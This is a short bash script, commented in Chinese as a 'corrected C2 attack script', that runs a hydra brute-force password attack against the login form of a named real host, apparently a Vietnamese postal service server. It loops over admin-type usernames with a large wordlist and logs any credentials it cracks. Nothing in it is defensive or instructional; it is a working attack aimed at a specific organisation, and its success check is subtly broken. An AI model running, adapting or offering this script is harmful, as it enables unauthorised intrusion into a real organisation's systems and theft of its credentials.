#!/bin/bash
# 修正后的C2攻击脚本

TARGET="vps.vnpost.vn"
WORDLIST="/root/vnpost_attack/vnpost_mega_wordlist.txt"
LOG="/root/vnpost_attack/corrected_attack.log"

echo "[$(date)] 开始修正后的攻击..." | tee -a $LOG

USERS=("admin" "root" "peplink" "administrator")

for user in "${USERS[@]}"; do
    echo "[*] 攻击用户: $user" | tee -a $LOG
    
    # 使用正确的失败特征检测
    hydra -l $user -P $WORDLIST \
        -s 443 \
        -t 10 \
        -w 3 \
        -f \
        $TARGET \
        https-post-form "/cgi-bin/MANGA/index.cgi:func=login&username=^USER^&password=^PASS^:F=login_box" \
        2>&1 | tee -a $LOG
    
    # 检查成功
    if grep -q "valid password found" $LOG | tail -10; then
        echo "[🔥] 成功！用户: $user" | tee -a $LOG
        grep "password:" $LOG | tail -5
        exit 0
    fi
done

echo "[$(date)] 攻击轮次完成" | tee -a $LOG
